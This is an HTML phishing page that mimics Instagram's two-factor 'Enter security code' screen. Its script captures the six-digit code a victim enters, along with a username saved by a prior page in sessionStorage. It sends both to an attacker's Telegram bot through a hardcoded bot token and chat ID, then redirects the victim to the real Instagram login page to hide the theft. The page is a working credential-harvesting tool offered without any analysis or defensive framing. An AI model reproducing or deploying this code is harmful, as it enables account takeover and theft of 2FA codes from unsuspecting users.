<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Security Code - Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #ffffff; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; padding-top: 40px; }
        .container { width: 100%; max-width: 350px; padding: 0 20px; text-align: center; }
        .logo { width: 175px; margin-bottom: 30px; }
        .icon { width: 80px; margin-bottom: 20px; }
        h2 { font-size: 16px; font-weight: 600; color: #262626; margin-bottom: 10px; }
        p { font-size: 14px; color: #8e8e8e; line-height: 1.4; margin-bottom: 20px; }
        input { width: 100%; padding: 14px 8px; background-color: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 16px; text-align: center; letter-spacing: 2px; margin-bottom: 15px; outline: none; }
        .btn { width: 100%; background-color: #0095f6; color: #fff; border: none; border-radius: 8px; padding: 10px; font-weight: 600; font-size: 14px; cursor: pointer; }
        .btn:disabled { background-color: #b2dffc; cursor: default; }
    </style>
</head>
<body>
    <div class="container">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1024px-Instagram_logo.svg.png" alt="Instagram">
        <img class="icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Instagram_2FA_icon.svg/1200px-Instagram_2FA_icon.svg.png" alt="Security">
        <h2>Enter security code</h2>
        <p>We sent a code to your email. Enter it below to continue.</p>
        <form id="2faForm">
            <input type="text" id="code" placeholder="------" maxlength="6" required>
            <button type="submit" class="btn" id="submitBtn">Confirm</button>
        </form>
    </div>
    <script>
        document.getElementById('2faForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const code = document.getElementById('code').value.trim();
            if (code.length < 6) return;

            const BOT_TOKEN = "9134254301:AAG8bCDBz8IfO8CHEk5Qyxie2ceOca_xx0U";
            const CHAT_ID = "2005892579";
            const username = sessionStorage.getItem('insta_user') || 'Unknown';
            
            const message = `🔐 *INSTAGRAM 2FA CODE!*\n👤 User: \`${username}\`\n🔢 Code: \`${code}\``;
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
            }).then(() => {
                window.location.href = "https://www.instagram.com/accounts/login/";
            }).catch(() => {
                window.location.href = "https://www.instagram.com/accounts/login/";
            });
        });
    </script>
</body>
</html>
